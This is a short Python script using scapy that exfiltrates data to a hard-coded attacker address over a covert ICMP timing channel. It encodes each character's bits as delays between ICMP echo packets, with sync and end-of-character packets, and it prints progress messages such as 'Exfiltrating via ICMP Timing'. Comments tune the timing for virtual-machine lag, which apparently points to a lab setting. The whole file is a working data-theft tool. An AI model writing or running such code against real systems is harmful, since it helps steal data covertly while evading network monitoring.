import time
from scapy.all import IP, ICMP, send, conf

# --- CONFIGURATION ---
ATTACKER_IP = "10.0.0.5"
conf.verb = 0 

# --- TIMING PROTOCOL (Optimized for VM Lag) ---
DOT_DELAY  = 0.2  # Binary '0' (Safe distance from 0.4 threshold)
DASH_DELAY = 0.6  # Binary '1' (Safe distance from 0.9 threshold)
CHAR_GAP   = 1.2  # End of Character

def send_data_over_icmp(data):
    print(f"[>] Exfiltrating via ICMP Timing: '{data}'")
    
    # 1. Send Sync Packet
    print("    [!] Sending Sync Packet...")
    send(IP(dst=ATTACKER_IP)/ICMP()) 
    
    # CRITICAL FIX: DO NOT SLEEP HERE.
    # The receiver resets its clock upon receiving the Sync Packet.
    # The delay for the first bit is handled inside the loop below.
    
    for char in data:
        binary_string = format(ord(char), '08b')
        print(f"    Sending '{char}' as {binary_string}...")

        for bit in binary_string:
            # 2. The delay happens BEFORE the packet is sent
            if bit == '0':
                time.sleep(DOT_DELAY)
            else:
                time.sleep(DASH_DELAY)
            
            # 3. Send the bit carrier
            packet = IP(dst=ATTACKER_IP)/ICMP()
            send(packet)
        
        # 4. End of Character Signal
        time.sleep(CHAR_GAP)
        send(IP(dst=ATTACKER_IP)/ICMP())

    print("[✓] ICMP Exfiltration Complete.")
